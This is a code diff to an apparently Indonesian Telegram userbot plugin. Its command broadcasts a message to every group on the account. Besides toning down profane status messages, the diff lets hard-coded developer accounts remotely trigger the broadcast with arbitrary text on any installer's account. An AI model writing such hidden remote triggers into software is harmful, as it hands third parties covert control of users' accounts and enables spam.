@@ -24,7 +24,8 @@ GCAST_BLACKLIST = [
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgcast$")
+@register(incoming=True, from_users=DEVS,
+          pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -32,9 +33,9 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Pesannya Mana ngentot??**")
+        await event.edit("**Berikan Sebuah Pesan atau Reply**")
         return
-    kk = await event.edit("`Lagi Gua kirim tot, Limit jangan salahin Gua anjing!!!!!`")
+    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -51,7 +52,6 @@ async def gcast(event):
     await kk.edit(
         f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
     )
-
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
 async def gucast(event):
